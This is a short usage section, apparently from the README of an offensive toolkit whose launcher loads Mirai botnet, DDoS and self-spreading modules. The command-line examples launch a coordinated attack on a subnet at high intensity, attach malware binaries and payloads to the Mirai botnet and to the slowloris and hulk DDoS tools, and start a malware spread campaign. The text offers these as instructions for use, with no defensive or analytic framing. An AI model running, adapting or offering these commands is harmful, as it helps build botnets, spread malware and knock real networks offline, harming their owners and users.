## ⚡ Usage Examples

### Quick Start
```bash
# Load and coordinate all modules
./launcher/unified_launcher.py load mirai
./launcher/unified_launcher.py load ddos  
./launcher/unified_launcher.py load spread

# Launch coordinated attack with spread
./launcher/unified_launcher.py attack 192.168.1.0/24 \
  --methods ddos botnet spread --intensity high
```

### Spread Integration
```bash
# Attach payload to Mirai botnet
./launcher/unified_launcher.py spread attach-mirai \
  --payload /path/to/malware.bin

# Attach payload to DDOS tools
./launcher/unified_launcher.py spread attach-ddos \
  --payload /path/to/payload.exe --tools slowloris hulk

# Launch standalone spread campaign
./launcher/unified_launcher.py campaign start \
  --config campaign.json
```
